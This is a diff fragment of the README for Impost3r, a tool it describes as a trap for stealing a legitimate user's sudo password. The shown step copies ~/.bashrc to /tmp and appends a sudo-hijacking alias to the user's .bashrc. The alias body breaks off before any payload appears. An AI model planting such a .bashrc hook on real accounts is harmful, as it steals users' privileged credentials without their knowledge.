@@ -29,7 +29,7 @@ Attackers can use Impost3r to make a trap to steal the legal user's sudo passwor
 
 - Then copy the original .bashrc file ```cp ～/.bashrc /tmp/```,and put this copy anywhere you like(In this case,i will use /tmp/)
 
-- Edit the original .bashrc,and add following sentences at the end of file:
+- Edit the original .bashrc,and add following sentences at the end of file(The param "/tmp/.impost3r" must be as the same as the following FILENAME you specified):
 
 ```
 alias sudo='impost3r() {
